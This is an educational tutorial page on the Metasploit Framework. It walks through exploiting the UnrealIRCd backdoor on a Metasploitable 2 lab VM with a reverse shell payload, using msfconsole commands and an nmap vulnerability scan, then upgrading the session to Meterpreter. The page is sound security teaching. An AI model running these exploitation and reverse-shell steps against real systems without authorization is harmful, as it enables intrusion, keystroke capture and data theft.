---
title: Metasploit Framework 
description: Learn about Metasploit, its purpose, and how to use it responsibly.
layout: ../../layouts/MainLayout.astro
---

# Diving into the Metasploit Framework 

If there's one tool that's synonymous with penetration testing, it's the Metasploit Framework. Maintained by Rapid7, Metasploit is an open-source project that provides security professionals with vital information about security vulnerabilities and aids in penetration testing and IDS signature development.

## Setup Before We Begin 

Before diving into the practical examples below, it's highly recommended to have a safe environment to practice in. Make sure you've set up your very own target by following our guide on the  [Metasploitable VM Setup](page-metasploitable). 

**Disclaimer:** *Always remember that you must only scan and exploit systems you own or have explicit permission to test.*

## Why is Metasploit So Popular? 

Metasploit is incredibly versatile. It's essentially a massive database of exploits, payloads, and auxiliary modules that can be easily pieced together to test the defenses of a network or system. Because it is open-source, the community constantly updates it with the latest exploits for newly discovered  [vulnerabilities](page-vulnerability).

## The Power of `msfconsole` 

While Metasploit has graphical interfaces (like Armitage), the primary and most powerful way to interact with it is through the command-line interface called `msfconsole`. It serves as a centralized hub granting access to almost all of Metasploit's capabilities.

### Installing Metasploit Framework 

If you are using Kali Linux or Parrot OS, Metasploit comes pre-installed! If you are on another Debian-based system (like the ones we set up in our  [Virtual Machines](page-3) guide), you might need to install it via your  [Apt Package Manager](page-apt-package-manager).

### Launching `msfconsole` 

To fire up the tool, follow these steps:

1. Open your terminal.
2. Type the following command:
```bash
msfconsole
```

You'll be greeted by a cool ASCII art banner and the Metasploit prompt:
```bash
msf6 >
```

## Your First Exploit: A Practical Example 

Let's look at a classic example of exploiting a known vulnerability. We'll target an IRC backdoor that exists in the Metasploitable 2 VM (port 6667). 

*Note: Before exploiting, you'd typically use a tool like  [Nmap](page-4) to discover open ports and services.*

```bash
# Example Nmap scan to find vulnerabilities:
nmap -sV -sT --script=vuln <target_ip>
```

Once you know what you're targeting, you can select the appropriate exploit in Metasploit using the `use` command:

```bash
msf6 > use exploit/unix/irc/unreal_ircd_3281_backdoor
```

### Setting the Payload

An exploit is the vehicle that breaks through the door; a **payload** is what you drop inside once you're through. Let's set a reverse shell payload, which will make the target connect back to our machine:

```bash
msf6 exploit(...) > set PAYLOAD cmd/unix/reverse
```

### Configuring Options

Next, you need to tell Metasploit where to point the exploit and where the payload should connect back to. You can view all required settings using the `show options` command:

```bash
msf6 exploit(...) > show options
```

Set the Remote Host (RHOST, your target) and the Local Host (LHOST, your machine's IP):

```bash
msf6 exploit(...) > set RHOST 192.168.0.50
msf6 exploit(...) > set LHOST 192.168.0.10
```

With everything configured, simply type `exploit` (or `run`) and hit Enter!

```bash
msf6 exploit(...) > exploit
```

If successful, you will be dropped into a command shell on the target machine.

## Upgrading Your Access 

Once you have a basic shell, you might want to upgrade it to a **Meterpreter** session. Meterpreter is an advanced, dynamically extensible payload that provides a ton of built-in commands (like downloading files, taking screenshots, or capturing keystrokes) without leaving much of a footprint on the target system.

To background your current shell and look at your sessions:
1. Press `Ctrl + Z` to background the session.
2. Type `sessions` to view all active connections.
3. Find your session number.
4. Upgrade it (syntax varies, but often involves using a post-exploitation module like `post/multi/manage/shell_to_meterpreter`).

Once in Meterpreter, simply type `help` to see all the incredible things you can do.

Stay responsible, keep learning, and always adhere to ethical hacking practices! 
